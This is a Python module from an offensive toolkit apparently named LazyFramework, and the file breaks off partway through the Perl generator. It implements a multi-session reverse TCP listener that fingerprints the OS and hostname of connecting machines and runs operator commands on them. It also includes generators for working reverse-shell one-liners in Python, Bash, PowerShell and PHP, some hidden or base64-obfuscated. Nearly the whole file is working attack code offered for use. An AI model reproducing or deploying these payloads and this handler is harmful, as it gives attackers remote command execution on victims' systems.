#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
REVERSE TCP MULTI-SESSION HANDLER - COMPLETE WITH ALL LANGUAGES v3.0
✅ FIXED: OS Detection dengan Confidence Scoring + Update Session.os
✅ FIXED: CLI Mode - Tidak kembali ke prompt setelah konek (blocking)
✅ FIXED: Clean output tanpa prompt shell
✅ FIXED: Rich Table untuk info, sessions, dan help
✅ FIXED: Help langsung print ke console, tidak return
"""

MODULE_INFO = {
    "name": "Reverse TCP Multi-Payload Handler",
    "description": "Generate reverse TCP payloads + Multi-session handler with command execution",
    "author": "LazyFramework",
    "platform": "multi",
    "rank": "Excellent",
    "types": "payloads",
    "category": "payloads",
    "dependencies": []
}

OPTIONS = {
    "LHOST": {
        "default": "0.0.0.0",
        "required": True,
        "description": "Listen IP address (0.0.0.0 for all interfaces)"
    },
    "LPORT": {
        "default": 4444,
        "required": True,
        "description": "Listen port number"
    },
    "LANGUAGE": {
        "default": "python",
        "required": False,
        "choices": [
            "python", "python2", "python3", "bash", "powershell", "php", "perl", 
            "ruby", "ruby2", "nodejs", "java", "groovy", "lua", "golang", "go",
            "dart", "telnet", "c", "csharp", "c#", "haskell", "nc", "netcat", 
            "all", "none"
        ],
        "description": "python|python2|python3|bash|powershell|php|perl|ruby|ruby2|nodejs|java|groovy|lua|golang|go|dart|telnet|c|csharp|c#|haskell|nc|netcat|all|none"
    },
    "USE_BASE64": {
        "default": True,
        "required": False,
        "description": "true|false (encode payload with base64)"
    },
    "AUTO_HANDLE": {
        "default": True,
        "required": False,
        "description": "true|false (auto-handle incoming sessions)"
    },
    "GUI_MODE": {
        "default": True,
        "required": False,
        "description": "true|false (enable GUI mode)"
    }
}

import socket
import threading
import time
import base64
import os
import sys
import select
import signal
from datetime import datetime

# Global sessions
SESSIONS = {}
SESSIONS_LOCK = threading.RLock()
_LISTENER_INSTANCE = None
_LISTENER_LOCK = threading.RLock()

# Colors
RED     = '\033[91m'
GREEN   = '\033[92m'
YELLOW  = '\033[93m'
BLUE    = '\033[94m'
MAGENTA = '\033[95m'
CYAN    = '\033[96m'
WHITE   = '\033[97m'
RESET   = '\033[0m'


def strip_colors(text):
    import re
    text = re.sub(r'\[/?[a-zA-Z0-9_]+\]', '', text)
    text = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', text)
    return text

def _gui_print(session, msg, style=None):
    import re
    clean = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', str(msg))
    clean = re.sub(r'\x1b\][^\x07]*\x07', '', clean)

    try:
        gui = None
        if isinstance(session, dict):
            gui = session.get("gui_instance")
        if gui and hasattr(gui, "append_output"):
            if style:
                gui.append_output(f"[{style}]{clean}[/{style}]")
            else:
                gui.append_output(clean)
            return
    except Exception:
        pass

    try:
        from rich.console import Console
        Console().print(clean)
    except Exception:
        print(clean, flush=True)


# ✅ FIXED: Improved detect_os_from_socket dengan confidence scoring
# reverse_tcp.py - detect_os_from_socket()

def detect_os_from_socket(sock):
    """
    ✅ IMPROVED: Deteksi OS dari socket dengan prioritas Kali
    """
    import re
    import select

    def clean(data: str) -> str:
        data = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', data)
        data = re.sub(r'\x1b\][^\x07]*\x07', '', data)
        data = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', data)
        return data.lower().strip()

    def try_cmd(cmd: bytes, timeout=2.0, retry=2) -> str:
        for attempt in range(retry):
            try:
                sock.settimeout(timeout)
                sock.send(cmd + b"\n")
                time.sleep(0.5)
                ready = select.select([sock], [], [], timeout)
                if ready[0]:
                    data = sock.recv(2048).decode('utf-8', errors='ignore')
                    result = clean(data)
                    if result:
                        return result
            except socket.timeout:
                if attempt < retry - 1:
                    time.sleep(0.3)
                continue
            except Exception:
                if attempt < retry - 1:
                    time.sleep(0.3)
                continue
            finally:
                try:
                    sock.settimeout(None)
                except:
                    pass
        return ""

    os_scores = {}

    # ===== KALI LINUX DETECTION (PRIORITAS) =====
    # 1. Cek /etc/os-release
    data = try_cmd(b"cat /etc/os-release 2>/dev/null", timeout=2.0, retry=2)
    if data:
        if "kali" in data:
            os_scores['kali'] = os_scores.get('kali', 0) + 10  # HIGH PRIORITY
        if "ubuntu" in data and "kali" not in data:
            os_scores['ubuntu'] = os_scores.get('ubuntu', 0) + 5
        if "debian" in data and "kali" not in data and "ubuntu" not in data:
            os_scores['debian'] = os_scores.get('debian', 0) + 4

    # 2. Cek /etc/issue
    data = try_cmd(b"cat /etc/issue 2>/dev/null", timeout=2.0, retry=2)
    if data:
        if "kali" in data:
            os_scores['kali'] = os_scores.get('kali', 0) + 8
        if "ubuntu" in data and "kali" not in data:
            os_scores['ubuntu'] = os_scores.get('ubuntu', 0) + 4

    # 3. Cek hostname / prompt untuk Kali
    data = try_cmd(b"echo $PS1 2>/dev/null", timeout=1.5, retry=1)
    if data and "kali" in data.lower():
        os_scores['kali'] = os_scores.get('kali', 0) + 5

    # 4. Cek uname untuk Linux
    data = try_cmd(b"uname -s 2>/dev/null", timeout=2.0, retry=2)
    if data:
        if "linux" in data and 'kali' not in os_scores:
            os_scores['linux'] = os_scores.get('linux', 0) + 2

    # 5. Windows detection
    data = try_cmd(b"echo %OS% 2>nul", timeout=2.0, retry=2)
    if "windows" in data:
        os_scores['windows'] = os_scores.get('windows', 0) + 5

    # 6. macOS detection
    data = try_cmd(b"sw_vers 2>/dev/null", timeout=2.0, retry=2)
    if data and "productname" in data:
        os_scores['macos'] = os_scores.get('macos', 0) + 5

    # ===== DETERMINE BEST MATCH =====
    if os_scores:
        best_os = max(os_scores, key=os_scores.get)
        confidence = os_scores[best_os]
        print(f"[*] OS Detection: {best_os} (confidence: {confidence})")
        return best_os, confidence

    return "unknown", 0


def detect_hostname_from_socket(sock, os_type):
    hostname = "unknown"
    
    try:
        if os_type == 'windows':
            commands = ["echo %COMPUTERNAME%", "hostname", "wmic computersystem get name 2>nul"]
        else:
            commands = ["hostname 2>/dev/null", "cat /etc/hostname 2>/dev/null", "uname -n 2>/dev/null"]
        
        for cmd in commands:
            try:
                sock.send(cmd.encode() + b"\n")
                time.sleep(0.5)
                ready = select.select([sock], [], [], 2)
                if ready[0]:
                    data = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    for line in data.split('\n'):
                        line = line.strip()
                        if not line:
                            continue
                        if line.startswith(('Microsoft', 'Name', 'Computer', '>', '$', '#')):
                            continue
                        if line in ['', '\n', '\r\n']:
                            continue
                        import re
                        clean_line = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', line)
                        clean_line = re.sub(r'[\[\]\{\}\(\)]', '', clean_line)
                        if re.match(r'^[a-zA-Z0-9_\-\.]{2,50}$', clean_line):
                            hostname = clean_line
                            break
                        elif len(clean_line) < 30 and ' ' not in clean_line and len(clean_line) > 1:
                            hostname = clean_line
                            break
                    if hostname != "unknown":
                        break
            except Exception:
                continue
    except Exception:
        pass
    
    if hostname == "unknown":
        try:
            sock.send(b"echo $PS1 2>/dev/null || echo %PROMPT% 2>nul\n")
            time.sleep(0.5)
            ready = select.select([sock], [], [], 1)
            if ready[0]:
                data = sock.recv(1024).decode('utf-8', errors='ignore')
                import re
                match = re.search(r'@([a-zA-Z0-9_\-\.]+)[:~\s]', data)
                if match:
                    hostname = match.group(1)
        except:
            pass
    
    return hostname


# ==================== SESSION HANDLER ====================
class ReverseTCPSession:
    def __init__(self, session_id, client_socket, client_addr, lhost, lport):
        self.id = session_id
        self.socket = client_socket
        self.rhost, self.rport = client_addr
        self.lhost = lhost
        self.lport = lport
        self.type = "reverse_tcp"
        self.status = "alive"
        self.created = datetime.now().strftime("%H:%M:%S")
        
        os_type, confidence = detect_os_from_socket(client_socket)
        self.os = os_type
        self._os_confidence = confidence
        self.hostname = detect_hostname_from_socket(client_socket, self.os)
        self.last_output = ""
        self._gui_mode = False

    def is_socket_alive(self):
        if not self.socket:
            return False
        try:
            ready = select.select([self.socket], [], [], 0)
            if ready[0]:
                data = self.socket.recv(1, socket.MSG_PEEK)
                if not data:
                    return False
            return True
        except:
            return False

    def _clean_output(self, data, command=None):
        """Bersihkan output shell dari prompt dan ANSI"""
        import re
        
        if not data:
            return ""
        
        # Clean ANSI/ESC
        data = re.sub(r'\x1b\[[0-9;?]*[a-zA-Z]', '', data)
        data = re.sub(r'\x1b\][^\x07]*\x07', '', data)
        data = re.sub(r'\x1b[=><]', '', data)
        data = re.sub(r'\x1b.', '', data)
        data = re.sub(r'\[\?2004[hl]', '', data)
        data = re.sub(r'\[\?[0-9]+[hl]', '', data)
        data = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', data)
        
        # Hapus semua variasi prompt
        prompt_patterns = [
            r'^[┌└]──.*\(.*㉿.*\).*\n?',
            r'^[┌└].*──.*\n?',
            r'^.*@.*[:~].*[#$]\s*\n?',
            r'^[\s]*[#$]\s*\n?',
            r'^\(.*㉿.*\)\n?',
            r'^└─└─.*\n?',
            r'^└─.*\n?',
            r'^┌──.*\n?',
        ]
        
        for pattern in prompt_patterns:
            data = re.sub(pattern, '', data, flags=re.MULTILINE)
        
        # Hapus command echo
        if command:
            cmd_clean = re.escape(command.strip())
            data = re.sub(rf'^{cmd_clean}\s*\n?', '', data, flags=re.MULTILINE)
        
        # Hapus garis kosong berlebih
        data = re.sub(r'\n{3,}', '\n\n', data)
        
        # Hapus prompt di akhir
        data = re.sub(r'\n[\s]*[#$]\s*$', '', data)
        data = re.sub(r'\n└─└─\s*$', '', data)
        data = re.sub(r'\n└─\s*$', '', data)
        
        # Clean final
        data = data.strip()
        data = re.sub(r'\n[\s]*[#$]\s*$', '', data)
        data = re.sub(r'^[┌└]──.*$', '', data, flags=re.MULTILINE)
        data = re.sub(r'^└─└─.*$', '', data, flags=re.MULTILINE)
        data = re.sub(r'^└─.*$', '', data, flags=re.MULTILINE)
        data = re.sub(r'^┌──.*$', '', data, flags=re.MULTILINE)
        data = re.sub(r'^\s*\n', '', data)
        
        return data

    def send_command(self, command):
        if not self.is_socket_alive():
            self.status = "dead"
            return "[!] Session is dead"
        
        try:
            if not command.endswith('\n'):
                command = command + '\n'
                
            self.socket.sendall(command.encode())
            time.sleep(0.3)
            result = ""
            self.socket.settimeout(3.0)
            
            while True:
                try:
                    data = self.socket.recv(4096).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    result += data
                    if len(data) < 1024:
                        break
                except socket.timeout:
                    break
                except Exception:
                    break
                    
            self.socket.settimeout(None)
            self.last_output = result
            
            return self._clean_output(result, command)
            
        except Exception as e:
            self.status = "dead"
            return f"[!] Error: {e}"

    def send_command_gui(self, command):
        if not self.is_socket_alive():
            self.status = "dead"
            return "[!] Session is dead"
        
        try:
            if not command.endswith('\n'):
                command = command + '\n'
                
            self.socket.sendall(command.encode())
            time.sleep(0.3)
            result = ""
            self.socket.settimeout(3.0)
            
            while True:
                try:
                    data = self.socket.recv(4096).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    result += data
                    if len(data) < 4096:
                        break
                except socket.timeout:
                    break
                except Exception:
                    break
                    
            self.socket.settimeout(None)
            self.last_output = result
            
            return self._clean_output(result, command)
            
        except Exception as e:
            self.status = "dead"
            return f"[!] Error: {e}"

    def close(self):
        """Close session - non-blocking, tidak boleh freeze"""
        self.status = "closed"
        sock = getattr(self, "socket", None)
        self.socket = None
        if not sock:
            return
        try:
            try:
                sock.settimeout(0.05)
            except Exception:
                pass
            try:
                sock.setblocking(False)
            except Exception:
                pass
            try:
                sock.close()
            except Exception:
                pass
        except Exception:
            pass

    def interactive_mode(self):
        """Interactive mode untuk CLI - dengan Rich Table"""
        try:
            from prompt_toolkit import prompt
            from prompt_toolkit.history import InMemoryHistory
            from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
            from prompt_toolkit.styles import Style
            from prompt_toolkit.formatted_text import ANSI
            
            style = Style.from_dict({
                'prompt': 'bold #00ff00',
            })
            history = InMemoryHistory()
            
            # Cek rich tersedia
            try:
                from rich.console import Console
                from rich.table import Table
                from rich.panel import Panel
                from rich import box
                RICH_AVAILABLE = True
                console = Console()
            except ImportError:
                RICH_AVAILABLE = False
            
            if RICH_AVAILABLE:
                console.print(Panel(
                    f"[bold green]┌────────────────────────────────────────┐[/]\n"
                    f"[bold green]│[/]  [bold white]LAZYFRAMEWORK METERPRETER[/]          [bold green]│[/]\n"
                    f"[bold green]│[/]  [dim]Session: {self.id}[/]                       [bold green]│[/]\n"
                    f"[bold green]│[/]  [dim]Target: {self.rhost}:{self.rport}[/]        [bold green]│[/]\n"
                    f"[bold green]└────────────────────────────────────────┘[/]",
                    border_style="green",
                    padding=(1, 2),
                    width=52
                ))
                console.print(f"[yellow]Type 'help' for commands | 'exit' to close[/]\n")
            else:
                print(f"{GREEN}[+] Entering interactive mode for {self.id}{RESET}")
                print(f"{YELLOW}[*] Type 'exit' or 'quit' to close session{RESET}")
                print(f"{YELLOW}[*] Type 'help' for commands{RESET}")
            
            while self.status == "alive":
                try:
                    cmd = prompt(
                        ANSI(f"\033[92m metepreter [{self.id}]> \033[0m"),
                        history=history,
                        auto_suggest=AutoSuggestFromHistory(),
                        style=style,
                    )
                    
                    if not cmd:
                        continue
                        
                    cmd = cmd.strip()
                    
                    if cmd.lower() in ['exit', 'quit']:
                        if RICH_AVAILABLE:
                            console.print("[yellow][*] Exiting session...[/]")
                        else:
                            print(f"{YELLOW}[*] Exiting session...{RESET}")
                        self.status = "closed"
                        break
                        
                    if cmd.lower() == 'help':
                        if RICH_AVAILABLE:
                            show_help_rich()
                        else:
                            print(show_help())
                        continue
                        
                    if cmd.lower() == 'info':
                        if RICH_AVAILABLE:
                            _show_info_rich(self, console)
                        else:
                            _show_info_plain(self)
                        continue
                        
                    if cmd.lower() == 'sessions':
                        if RICH_AVAILABLE:
                            _show_sessions_rich(console)
                        else:
                            _show_sessions_plain()
                        continue
                        
                    # ===== KIRIM COMMAND =====
                    output = self.send_command(cmd)
                    if output:
                        if RICH_AVAILABLE:
                            console.print(Panel(
                                output,
                                border_style="dim",
                                padding=(0, 1),
                                width=80
                            ))
                        else:
                            print(output)
                        
                except KeyboardInterrupt:
                    if RICH_AVAILABLE:
                        console.print("\n[yellow][*] Interrupted — closing session[/]")
                    else:
                        print(f"\n{YELLOW}[*] Interrupted — closing session{RESET}")
                    self.status = "closed"
                    break
                except EOFError:
                    self.status = "closed"
                    break
                except Exception as e:
                    if RICH_AVAILABLE:
                        console.print(f"[red][!] Error: {e}[/]")
                    else:
                        print(f"{RED}[!] Error: {e}{RESET}")
                    self.status = "closed"
                    break
                    
        except ImportError:
            # Fallback ke input biasa
            print(f"{GREEN}[+] Entering interactive mode for {self.id}{RESET}")
            try:
                while self.status == "alive":
                    try:
                        cmd = input(f"{self.id}> ").strip()
                        if not cmd:
                            continue
                        if cmd.lower() in ['exit', 'quit']:
                            break
                        if cmd.lower() == 'help':
                            print(show_help())
                            continue
                        if cmd.lower() == 'info':
                            _show_info_plain(self)
                            continue
                        if cmd.lower() == 'sessions':
                            _show_sessions_plain()
                            continue
                        output = self.send_command(cmd)
                        if output:
                            print(output)
                    except KeyboardInterrupt:
                        print(f"\n{YELLOW}[*] Exiting...{RESET}")
                        break
                    except EOFError:
                        break
            except Exception as e:
                print(f"{RED}[!] Interactive mode error: {e}{RESET}")
        
        self.close()
        try:
            with SESSIONS_LOCK:
                if self.id in SESSIONS:
                    del SESSIONS[self.id]
            print(f"{GREEN}[+] Session {self.id} killed and removed{RESET}")
        except:
            pass


# ==================== RICH HELPERS ====================

def _show_info_rich(session, console):
    """Tampilkan info session dengan Rich Table"""
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    
    os_icons = {
        'windows': '🪟', 'linux': '🐧', 'kali': '🐉',
        'ubuntu': '🔶', 'debian': '🌀', 'macos': '🍎',
        'freebsd': '🐋', 'unknown': '💻'
    }
    os_icon = os_icons.get(session.os.lower() if session.os else 'unknown', '💻')
    status_icon = "🟢" if session.status == "alive" else "🔴"
    status_color = "green" if session.status == "alive" else "red"
    
    table = Table(
        title=f"[bold cyan]📡 SESSION INFORMATION[/]",
        box=box.HEAVY,
        border_style="cyan",
        title_style="bold cyan",
        show_header=False,
        padding=(0, 2),
        width=60
    )
    table.add_column("Property", style="bold white", width=18, no_wrap=True)
    table.add_column("Value", style="white")
    
    table.add_row("Session ID", f"[cyan]{session.id}[/]")
    table.add_row("Remote Host", f"[yellow]{session.rhost}:{session.rport}[/]")
    table.add_row("Local Host", f"[yellow]{session.lhost}:{session.lport}[/]")
    table.add_row("OS", f"{os_icon} [green]{session.os.upper() if session.os else 'UNKNOWN'}[/]")
    table.add_row("Hostname", f"[white]{session.hostname if session.hostname else 'unknown'}[/]")
    table.add_row("Status", f"[{status_color}]{status_icon} {session.status.upper() if session.status else 'UNKNOWN'}[/]")
    table.add_row("Created", f"[dim]{session.created}[/]")
    table.add_row("Type", f"[cyan]{session.type}[/]")
    
    if hasattr(session, '_os_confidence'):
        conf = min(session._os_confidence, 10)
        conf_bar = "█" * conf + "░" * (10 - conf)
        table.add_row("Confidence", f"[green]{conf_bar}[/] {conf}/10")
    
    console.print(table)

def _show_info_plain(session):
    """Tampilkan info session plain text"""
    os_icons = {
        'windows': '🪟', 'linux': '🐧', 'kali': '🐉',
        'ubuntu': '🔶', 'debian': '🌀', 'macos': '🍎',
        'freebsd': '🐋', 'unknown': '💻'
    }
    os_icon = os_icons.get(session.os.lower() if session.os else 'unknown', '💻')
    status_icon = "🟢" if session.status == "alive" else "🔴"
    
    print(f"Session ID  : {session.id}")
    print(f"Remote Host : {session.rhost}:{session.rport}")
    print(f"Local Host  : {session.lhost}:{session.lport}")
    print(f"OS          : {os_icon} {session.os.upper() if session.os else 'UNKNOWN'}")
    print(f"Hostname    : {session.hostname if session.hostname else 'unknown'}")
    print(f"Status      : {status_icon} {session.status.upper() if session.status else 'UNKNOWN'}")
    print(f"Created     : {session.created}")
    print(f"Type        : {session.type}")

def _show_sessions_rich(console):
    """Tampilkan daftar sessions dengan Rich Table"""
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    
    with SESSIONS_LOCK:
        if not SESSIONS:
            console.print("[yellow]No active sessions[/]")
            return
            
        table = Table(
            title=f"[bold yellow]📊 Active Sessions ({len(SESSIONS)})[/]",
            box=box.HEAVY,
            border_style="yellow",
            width=70
        )
        table.add_column("#", style="dim", width=4)
        table.add_column("ID", style="cyan", width=15)
        table.add_column("Remote", style="white", width=20)
        table.add_column("OS", style="green", width=12)
        table.add_column("Status", style="yellow", width=10)
        
        os_icons = {
            'windows': '🪟', 'linux': '🐧', 'kali': '🐉',
            'ubuntu': '🔶', 'debian': '🌀', 'macos': '🍎',
            'freebsd': '🐋', 'unknown': '💻'
        }
        
        for idx, (sid, sess) in enumerate(SESSIONS.items(), 1):
            os_type = sess.os.lower() if hasattr(sess, 'os') and sess.os else 'unknown'
            os_icon = os_icons.get(os_type, '💻')
            status_color = "green" if sess.status == "alive" else "red"
            status_icon = "🟢" if sess.status == "alive" else "🔴"
            
            table.add_row(
                str(idx),
                sid[:12],
                f"{sess.rhost}:{sess.rport}",
                f"{os_icon}",
                f"[{status_color}]{status_icon}[/]"
            )
        
        console.print(table)

def _show_sessions_plain():
    """Tampilkan daftar sessions plain text"""
    with SESSIONS_LOCK:
        if not SESSIONS:
            print("No active sessions")
            return
        print(f"\nActive sessions: {len(SESSIONS)}")
        os_icons = {
            'windows': '🪟', 'linux': '🐧', 'kali': '🐉',
            'ubuntu': '🔶', 'debian': '🌀', 'macos': '🍎',
            'freebsd': '🐋', 'unknown': '💻'
        }
        for sid in SESSIONS.keys():
            sess = SESSIONS[sid]
            os_type = sess.os.lower() if hasattr(sess, 'os') and sess.os else 'unknown'
            os_icon = os_icons.get(os_type, '💻')
            status_icon = "🟢" if sess.status == "alive" else "🔴"
            print(f"  {os_icon} {sid} [{status_icon} {sess.status}]")


# ==================== HELP FUNCTIONS ====================

def show_help_rich():
    """Tampilkan help pakai Rich Table - langsung ke console"""
    try:
        from rich.console import Console
        from rich.table import Table
        from rich.panel import Panel
        from rich import box
        
        console = Console()
        
        lang_table = Table(
            box=box.SIMPLE,
            show_header=True,
            header_style="bold cyan",
            border_style="yellow",
            expand=False,
            padding=(0, 1),
            width=70
        )
        lang_table.add_column("Language", style="bold white", width=14)
        lang_table.add_column("Aliases / Notes", style="white", min_width=40)

        languages = [
            ("Python", "python, python2, python3"),
            ("Bash", "bash"),
            ("PowerShell", "powershell"),
            ("PHP", "php"),
            ("Perl", "perl"),
            ("Ruby", "ruby, ruby2"),
            ("Node.js", "nodejs"),
            ("Java", "java (requires JDK)"),
            ("Groovy", "groovy (requires Groovy)"),
            ("Lua", "lua (requires luasocket)"),
            ("Golang", "golang, go"),
            ("Dart", "dart (requires Dart SDK)"),
            ("Telnet", "telnet (reverse shell via telnet)"),
            ("C", "c (requires gcc)"),
            ("C#/Csharp", "csharp (requires mono/mcs)"),
            ("Haskell", "haskell (requires runhaskell)"),
            ("Netcat", "nc, netcat"),
        ]
        for name, note in languages:
            lang_table.add_row(name, note)

        cmd_table = Table(
            box=box.SIMPLE,
            show_header=True,
            header_style="bold cyan",
            border_style="yellow",
            expand=False,
            padding=(0, 1),
            width=70
        )
        cmd_table.add_column("Command", style="bold green", width=14)
        cmd_table.add_column("Description", style="white", min_width=40)

        commands = [
            ("help", "Show this help"),
            ("info", "Show session information"),
            ("sessions", "Show all active sessions"),
            ("exit / quit", "Close session"),
            ("<command>", "Execute command on target"),
        ]
        for name, desc in commands:
            cmd_table.add_row(name, desc)

        console.print(Panel(lang_table, title="[bold yellow]SUPPORTED LANGUAGES[/bold yellow]",
                            border_style="yellow", expand=False))
        console.print(Panel(cmd_table, title="[bold yellow]COMMANDS[/bold yellow]",
                            border_style="yellow", expand=False))
        return ""
    except Exception:
        print(show_help())
        return ""

def show_help():
    """Plain text help fallback"""
    return (
        f"\n{YELLOW}REVERSE TCP HANDLER HELP{RESET}\n"
        f"{GREEN}Languages:{RESET} python, bash, powershell, php, perl, ruby, nodejs, java, groovy, lua, golang, dart, telnet, c, csharp, haskell, nc\n"
        f"{GREEN}Commands:{RESET} help | info | sessions | exit/quit | <command>\n"
    )


# ==================== LISTENER ====================
class ReverseTCPListener:
    def __init__(self, lhost, lport, auto_handle=True):
        self.lhost = lhost
        self.lport = lport
        self.auto_handle = auto_handle
        self.running = False
        self.server_socket = None
        self.gui_mode = True
        self.gui_instance = None
        self._stop_event = threading.Event()
        self._lock = threading.RLock()
        self._thread = None
    
    def start(self):
        global _LISTENER_INSTANCE
        with _LISTENER_LOCK:
            if _LISTENER_INSTANCE is not None and _LISTENER_INSTANCE != self:
                print("[!] Stopping existing listener before starting new one...")
                _LISTENER_INSTANCE.stop()
                time.sleep(0.5)
                _LISTENER_INSTANCE = None
            _LISTENER_INSTANCE = self
        
        self.running = True
        self._stop_event.clear()
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            
            try:
                self.server_socket.bind((self.lhost, self.lport))
            except OSError as e:
                print(f"[!] Failed to bind to {self.lhost}:{self.lport} - {e}")
                print("[!] Port may be in use. Try killing the existing listener.")
                self.running = False
                with _LISTENER_LOCK:
                    if _LISTENER_INSTANCE == self:
                        _LISTENER_INSTANCE = None
                return
            
            self.server_socket.listen(5)
            
            print(f"""
    {YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}
    {YELLOW}║                    LAZYFRAMEWORK METERPRETER                      ║{RESET}
    {YELLOW}║                       REVERSE TCP LISTENER                        ║{RESET}
    {YELLOW}╠══════════════════════════════════════════════════════════════════╣{RESET}
    {YELLOW}║{RESET}  {GREEN}Host{RESET}: {WHITE}{self.lhost}{RESET:<45} {YELLOW}║{RESET}
    {YELLOW}║{RESET}  {GREEN}Port{RESET}: {WHITE}{self.lport}{RESET:<45} {YELLOW}║{RESET}
    {YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}
    """)
            
            print(f"{YELLOW}[*] Waiting for incoming connections...{RESET}\n")
            
            while self.running and not self._stop_event.is_set():
                try:
                    try:
                        client, addr = self.server_socket.accept()
                    except socket.timeout:
                        continue
                    
                    if not self.running or self._stop_event.is_set():
                        try:
                            client.close()
                        except:
                            pass
                        break
                    
                    print(f"{GREEN}[+] Connection from {addr[0]}:{addr[1]}{RESET}")
                    
                    with SESSIONS_LOCK:
                        session_id = f"session_{len(SESSIONS) + 1}"
                    
                    session = ReverseTCPSession(session_id, client, addr, self.lhost, self.lport)
                    session._gui_mode = getattr(self, 'gui_mode', True)
                    
                    # Kirim newline saja, tidak ada welcome banner
                    try:
                        client.send(b"\n")
                    except:
                        pass
                    
                    with SESSIONS_LOCK:
                        SESSIONS[session_id] = session
                    
                    print(f"{GREEN}[+] Session {session_id} opened ({addr[0]}:{addr[1]} -> {self.lhost}:{self.lport}){RESET}")
                    print(f"{CYAN}[*] OS Detected: {session.os.upper()} (confidence: {session._os_confidence}){RESET}")
                    print(f"[*] Total sessions: {len(SESSIONS)}")
                    
                    # ✅ EMIT SIGNAL KE GUI
                    if self.gui_instance and hasattr(self.gui_instance, 'session_connected'):
                        session_info = {
                            'id': session_id,
                            'rhost': addr[0],
                            'rport': addr[1],
                            'lhost': self.lhost,
                            'lport': self.lport,
                            'os': session.os,
                            'hostname': session.hostname,
                            '_os_confidence': session._os_confidence,
                            'handler': session,
                        }
                        try:
                            self.gui_instance.session_connected.emit(session_info)
                        except Exception as e:
                            print(f"[!] Error emitting signal: {e}")
                    
                    if self.auto_handle and not getattr(self, 'gui_mode', False):
                        # ✅ Jalankan interactive mode di thread terpisah
                        t = threading.Thread(target=session.interactive_mode, daemon=True)
                        t.start()
                    else:
                        print(f"[+] Session {session_id} ready for GUI handling")
                        
                except socket.timeout:
                    continue
                except OSError as e:
                    if self.running:
                        print(f"[!] Socket error: {e}")
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[!] Error: {str(e)}")
                    continue
                
        except Exception as e:
            print(f"[!] Listener error: {e}")
            self.running = False
        finally:
            self.stop()
    
    def stop(self):
        global _LISTENER_INSTANCE
        self.running = False
        try:
            self._stop_event.set()
        except Exception:
            pass

        sock = self.server_socket
        self.server_socket = None
        if sock:
            try:
                try:
                    sock.settimeout(0.05)
                except Exception:
                    pass
                try:
                    sock.setblocking(False)
                except Exception:
                    pass
                try:
                    sock.close()
                except Exception:
                    pass
            except Exception:
                pass

        with SESSIONS_LOCK:
            for session_id, session in list(SESSIONS.items()):
                try:
                    session.close()
                except Exception:
                    pass
            SESSIONS.clear()

        with _LISTENER_LOCK:
            if _LISTENER_INSTANCE == self:
                _LISTENER_INSTANCE = None

        print(f"{GREEN}[+] Listener stopped safely{RESET}")


# ==================== PAYLOAD GENERATORS - ALL LANGUAGES ====================

# --- Python ---
def generate_python(lhost, lport, level, use_b64):
    payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | python3"
    return payload

def generate_python2(lhost, lport, level, use_b64):
    payload = f"python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | python2"
    return payload

def generate_python3(lhost, lport, level, use_b64):
    return generate_python(lhost, lport, level, use_b64)

# --- Bash ---
def generate_bash(lhost, lport, level, use_b64):
    payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | bash"
    return payload

# --- PowerShell ---
def generate_powershell(lhost, lport, level, use_b64):
    payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {payload_b64}"
    return payload

# --- PHP ---
def generate_php(lhost, lport, level, use_b64):
    payload = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    if use_b64:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        return f"echo {payload_b64} | base64 -d | php"
    return payload

# --- Perl ---
def generate_perl(lhost, lport, level, use_b64):
    payload = "perl -e 'use Socket;$i=\"" + lhost + "\";$p=" + str(lport) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    if use_b64:
